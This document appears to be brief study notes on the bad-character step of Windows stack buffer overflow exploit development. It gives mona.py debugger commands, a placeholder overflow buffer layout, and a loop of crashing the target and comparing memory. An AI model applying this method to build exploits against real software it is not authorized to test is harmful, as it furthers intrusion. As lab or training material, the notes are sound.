# Bad chars

1. On Windows:
    - `!mona config -set workingfolder c:\mona\%p`
    - `!mona bytearray -b "\x00"`   # \x00 is by default a bad char
2. Generate string of bad chars that is identical to bytearray

```Bash
./genbadchars.py
```

3. Put the string of bad chars after the B's in your buffer:

```Python
buffer = b'A' * <offset> + b'B' * 4 + <badchars>
```

4. Crash the app with the badchars and compare with mona:
     - Copy ESP each time you crash it cuz it may change
     - `!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP>`
5. Generate new bytearray, exclude badchars and start over:
     - `!mona bytearray -b "\x00\x0a"`
     - delete badchar from buffer
     - crash app and copy ESP again
     - `!mona compare -f C:\mona\<appname>\bytearray.bin -a <ESP>`
 
